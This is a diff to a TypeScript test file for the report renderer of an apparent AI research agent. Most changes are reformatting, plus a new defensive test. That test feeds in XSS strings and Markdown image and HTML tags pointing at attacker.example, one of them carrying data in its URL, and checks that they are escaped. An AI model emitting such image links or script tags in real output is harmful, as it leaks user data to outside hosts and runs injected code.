@@ -141,7 +141,8 @@ describe("ResearchReport.check", () => {
   test("warns about sentences with a number, a date or a name and no note, without refusing them", () => {
     const report = {
       ...input,
-      answer: "Heat pumps save energy [N1]. The IEA expects 600 million by 2030. Most homes benefit. Ask Mara Lindqvist.",
+      answer:
+        "Heat pumps save energy [N1]. The IEA expects 600 million by 2030. Most homes benefit. Ask Mara Lindqvist.",
     }
     const problems = ResearchReport.check(report, { notes, plan })
     expect(problems.errors).toEqual([])
@@ -155,12 +156,20 @@ describe("ResearchReport.render", () => {
     sources,
     judged: false,
     unverified: new Set(["N2"]),
-    method: { searches: 3, pages: 5, queries: ["heat pumps cold climate study"], spend: "$0.42 at list prices", seconds: 200 },
+    method: {
+      searches: 3,
+      pages: 5,
+      queries: ["heat pumps cold climate study"],
+      spend: "$0.42 at list prices",
+      seconds: 200,
+    },
   })
 
   test("turns citations into source chips with footnoted quotes", () => {
     expect(rendered.markdown).toContain("in the study \\[S1 p.12\\][^N1].")
-    expect(rendered.markdown).toContain('[^N1]: "used 61 percent less delivered energy for heating" Heat pumps in cold climates, nature.com (S1 p.12)')
+    expect(rendered.markdown).toContain(
+      '[^N1]: "used 61 percent less delivered energy for heating" Heat pumps in cold climates, nature.com (S1 p.12)',
+    )
   })
 
   test("leaves out notes the judge found unsupported and notes no longer in their source", () => {
@@ -168,7 +177,9 @@ describe("ResearchReport.render", () => {
     expect(rendered.markdown).not.toContain("[^N6]:")
     expect(rendered.markdown).not.toContain("[^N2]:")
     expect(rendered.markdown).toContain(`## ${ResearchReport.REMOVED}`)
-    expect(rendered.markdown).toContain("- ~~Bills fell everywhere~~ (N6, S2). The judge found the quote does not support it.")
+    expect(rendered.markdown).toContain(
+      "- ~~Bills fell everywhere~~ (N6, S2). The judge found the quote does not support it.",
+    )
     expect(rendered.markdown).toContain(`(N2, S2). ${ResearchReport.NO_LONGER}`)
   })
 
@@ -180,7 +191,9 @@ describe("ResearchReport.render", () => {
     ])
     expect(rendered.markdown).toContain("Confidence: Medium (Vector's estimate)")
     expect(rendered.markdown).toContain("Confidence: Low (Vector's estimate) · Sources disagree")
-    expect(rendered.markdown).toContain('> S1: "stayed above 2.0 on days below minus 15 degrees"\n>\n> S2: "struggle badly in deep cold"')
+    expect(rendered.markdown).toContain(
+      '> S1: "stayed above 2.0 on days below minus 15 degrees"\n>\n> S2: "struggle badly in deep cold"',
+    )
   })
 
   test("counts a copy as the site it copies, so it is not a second independent site", () => {
@@ -194,7 +207,9 @@ describe("ResearchReport.render", () => {
       { ...input, sections: [{ heading: "One site", body: "Said twice [N2][N3]." }] },
       {
         notes,
-        sources: sources.map((source) => (source.id === "S3" ? { ...source, signals: signal({ duplicate_of: "S2" }) } : source)),
+        sources: sources.map((source) =>
+          source.id === "S3" ? { ...source, signals: signal({ duplicate_of: "S2" }) } : source,
+        ),
         judged: false,
         method: { searches: 0, pages: 0 },
       },
@@ -203,10 +218,19 @@ describe("ResearchReport.render", () => {
   })
 
   test("ends with a Sources table and the Method, and keeps a page's title from breaking the table or its link", () => {
-    const table = rendered.markdown.slice(rendered.markdown.indexOf("## Sources"), rendered.markdown.indexOf("## Method"))
-    expect(table).toContain("| S1 | [Heat pumps in cold climates](https://www.nature.com/articles/heat-pumps) | nature.com | Read | Primary source · DOI 10.1000/hp |")
-    expect(table).toContain("| S3 | [Heat pumps cut bills (syndicated)](https://copy.example.com/heat-pumps) | example.com | Copy | Copy of S2 |")
-    expect(table).toContain("| S4 | [https://spa.example.org/app](https://spa.example.org/app) | example.org | Skipped: needs the desktop browser |")
+    const table = rendered.markdown.slice(
+      rendered.markdown.indexOf("## Sources"),
+      rendered.markdown.indexOf("## Method"),
+    )
+    expect(table).toContain(
+      "| S1 | [Heat pumps in cold climates](https://www.nature.com/articles/heat-pumps) | nature.com | Read | Primary source · DOI 10.1000/hp |",
+    )
+    expect(table).toContain(
+      "| S3 | [Heat pumps cut bills (syndicated)](https://copy.example.com/heat-pumps) | example.com | Copy | Copy of S2 |",
+    )
+    expect(table).toContain(
+      "| S4 | [https://spa.example.org/app](https://spa.example.org/app) | example.org | Skipped: needs the desktop browser |",
+    )
     expect(table).toContain(
       "| S5 | [Click \\[here\\](javascript:alert(1)) \\| now](https://evil.example.net/a_%28b%29) | example.net | Skipped: Vector could not reach the site. |",
     )
@@ -216,6 +240,28 @@ describe("ResearchReport.render", () => {
     expect(method).toContain("- Spend: $0.42 at list prices\n- Time: 3 min")
     expect(rendered.markdown.startsWith("# Heat pumps in cold climates\n")).toBe(true)
     expect(rendered.markdown).toContain("## Open questions\n\n- What do installations cost?")
+  })
+
+  test("leaves no image or raw HTML from the model's or a page's words in the Markdown", () => {
+    const hostile = ResearchReport.render(
+      {
+        title: "Heat <script>alert(1)</script> pumps",
+        answer: "See ![chart](https://attacker.example/c?d=Acme-Q3) and <img src=https://attacker.example/p> [N1].",
+        sections: [{ heading: "<b>Energy</b>", body: "![x][ref] saved [N1].\n\n[ref]: https://attacker.example/r" }],
+        open_questions: ["<iframe src=https://attacker.example/f>"],
+        method_notes: "![m](https://attacker.example/m)",
+      },
+      {
+        notes: [note("N1", { quote: "used <img src=x> 61 percent ![q](https://attacker.example/q)" })],
+        sources: [{ ...sources[0]!, title: "<img src=https://attacker.example/t>" }],
+        judged: false,
+        method: { searches: 1, pages: 1, queries: ["<img src=https://attacker.example/s>"] },
+      },
+    )
+    expect(hostile.markdown).not.toMatch(/(?<!\\)</)
+    expect(hostile.markdown).not.toMatch(/!\[/)
+    expect(hostile.markdown).toContain("See !\\[chart](https://attacker.example/c?d=Acme-Q3) and \\<img")
+    expect(hostile.markdown).toContain("# Heat \\<script>alert(1)\\</script> pumps")
   })
 
   test("made no connection", () => {
